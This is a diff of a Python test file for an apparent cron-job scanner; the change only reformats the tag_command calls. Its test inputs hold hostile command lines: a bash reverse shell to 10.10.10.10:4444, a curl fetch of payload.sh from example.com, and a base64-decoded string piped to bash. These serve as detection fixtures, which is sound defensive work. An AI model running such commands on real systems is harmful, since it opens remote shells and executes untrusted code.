@@ -11,50 +11,38 @@ def write_crontab(tmp_path: Path, content: str) -> Path:
 
 
 def test_tag_command_detects_reverse_shell():
-    tags = cron.tag_command(
-        "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
-    )
+    tags = cron.tag_command("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")
 
     assert "reverse_shell" in tags
 
 
 def test_tag_command_detects_external_payload():
-    tags = cron.tag_command(
-        "curl http://example.com/payload.sh -o /tmp/payload.sh"
-    )
+    tags = cron.tag_command("curl http://example.com/payload.sh -o /tmp/payload.sh")
 
     assert "external_payload" in tags
     assert "temp_execution" in tags
 
 
 def test_tag_command_detects_base64_decode():
-    tags = cron.tag_command(
-        "echo ZWNobyBoZWxsbw== | base64 -d | bash"
-    )
+    tags = cron.tag_command("echo ZWNobyBoZWxsbw== | base64 -d | bash")
 
     assert "encoded_execution" in tags
 
 
 def test_tag_command_detects_hidden_execution():
-    tags = cron.tag_command(
-        "/home/alice/.hidden/payload"
-    )
+    tags = cron.tag_command("/home/alice/.hidden/payload")
 
     assert "hidden_execution" in tags
 
 
 def test_normal_command_is_not_flagged():
-    tags = cron.tag_command(
-        "/usr/bin/find /var/log -type f -mtime +7 -delete"
-    )
+    tags = cron.tag_command("/usr/bin/find /var/log -type f -mtime +7 -delete")
 
     assert tags == []
 
 
 def test_apt_config_eval_is_not_flagged_as_encoded_execution():
-    tags = cron.tag_command(
-        'eval $(apt-config shell StateDir Dir::State/d)'
-    )
+    tags = cron.tag_command("eval $(apt-config shell StateDir Dir::State/d)")
 
     assert "encoded_execution" not in tags
 
